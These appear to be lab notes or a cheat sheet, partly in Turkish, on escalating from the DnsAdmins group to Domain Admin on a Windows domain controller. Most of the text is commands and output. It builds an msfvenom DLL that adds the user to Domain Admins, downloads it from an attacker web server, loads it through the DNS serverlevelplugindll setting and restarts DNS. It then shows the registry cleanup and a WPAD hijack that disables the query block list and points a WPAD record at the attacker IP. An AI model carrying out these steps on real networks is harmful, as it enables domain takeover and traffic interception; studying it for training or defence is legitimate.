# DnsAdmins

## Current User Groups

```pwsh
PS C:\Users\netadm> whoami /groups
```

```output title="Output" hl_lines="16"
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
INLANEFREIGHT\DnsAdmins                    Alias            S-1-5-21-669053619-2741956077-1013132368-1101 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

## [SID](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) Format

```text title="Format"
S-R-X-Y1-Y2-Y3-...-YN
```

| COMMAND | DESCRIPTION |
|---|---|
| S | SID |
| R | Revizyon Seviyesi |
| X | [Otorite](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids) |
| Y | Alt Otoriteler |
| YN | RID |

## SID

```pwsh
PS C:\Users\netadm> wmic USERACCOUNT WHERE "Name='netadm'" GET SID
```

```output title="Output"
SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

1. S
2. 1
3. 5
4. 669053619-2741956077-1013132368
5. 1109

## [SDDL](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format) Format

```text title="Format"
O:SIDG:SIDD:FLAGS(STRING1)...(STRINGN)S:FLAGS(STRING1)...(STRINGN)
```

| VALUE | MEANING |
|---|---|
| O: | [Owner](https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings) |
| G: | [Group](https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings) |
| D: | DACL |
| S: | SACL |

## SDDL

```pwsh
PS C:\Users\netadm> sc.exe sdshow DNS
```

```output title="Output"
D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
```

1. D:
2. (A;;CCLCSWLOCRRC;;;IU)
3. (A;;CCLCSWLOCRRC;;;SU)
4. (A;;CCLCSWRPWPDTLOCRRC;;;SY)
5. (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
6. (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)
7. (A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
    * A;
    * ;
    * RPWP;
    * ;
    * ;
    * S-1-5-21-669053619-2741956077-1013132368-1109

## Attacking DNS on Domain Controller

### Creating the Payload

```sh
my@attack:~$ msfvenom -p windows/x64/exec CMD='net group "Domain Admins" netadm /add /domain' -f dll -o malicious.dll
```

### Web Server

```sh
my@attack:~$ python3 -m http.server 8888
```

### Transferring

```pwsh
PS C:\Users\netadm> Invoke-WebRequest -Uri "http://10.10.14.164:8888/malicious.dll" -OutFile "C:\Users\netadm\Desktop\malicious.dll"
```

### Loading the DLL

```pwsh
PS C:\Users\netadm> dnscmd /config /serverlevelplugindll "C:\Users\netadm\Desktop\malicious.dll"
```

```output title="Output"
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

### DNS Stop

```pwsh
PS C:\Users\netadm> sc.exe stop DNS
```

```output title="Output" hl_lines="3"
SERVICE_NAME: DNS
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

### DNS Query

```pwsh
PS C:\Users\netadm> sc.exe query DNS
```

```output title="Output" hl_lines="3"
SERVICE_NAME: DNS
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### DNS Stop (STOP_PENDING State Problem)

```pwsh
PS C:\Users\netadm> foreach ($processPID in (Get-Process dns).Id) {taskkill /f /pid $processPID}
```

```output title="Output"
SUCCESS: The process with PID 3928 has been terminated.
```

### DNS Start

```pwsh
PS C:\Users\netadm> sc.exe start DNS
```

```output title="Output" hl_lines="3"
SERVICE_NAME: DNS
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 5056
        FLAGS
```

### Checking Attack Results

```pwsh
PS C:\Users\netadm> net group "Domain Admins" /domain
```

```output title="Output" hl_lines="7"
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

## Cleaning Up

### Registry Entry Query

```pwsh
PS C:\Users\netadm> reg query "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters"
```

```output title="Output" hl_lines="10"
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    C:\Users\netadm\Desktop\malicious.dll
```

### Registry Entry Delete

```pwsh
PS C:\Users\netadm> reg delete "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll /f
```

```output title="Output"
The operation completed successfully.
```

## [WPAD](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol)

### Disabling Global Query Block List

```pwsh
PS C:\Users\netadm> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName WINLPE-DC01.INLANEFREIGHT.LOCAL
```

### [Adding](https://learn.microsoft.com/en-us/powershell/module/dnsserver/add-dnsserverresourcerecorda?view=windowsserver2025-ps) Record

```pwsh
PS C:\Users\netadm> Add-DnsServerResourceRecordA -Name WPAD -ZoneName INLANEFREIGHT.LOCAL -ComputerName WINLPE-DC01.INLANEFREIGHT.LOCAL -IPv4Address 10.10.14.164
```
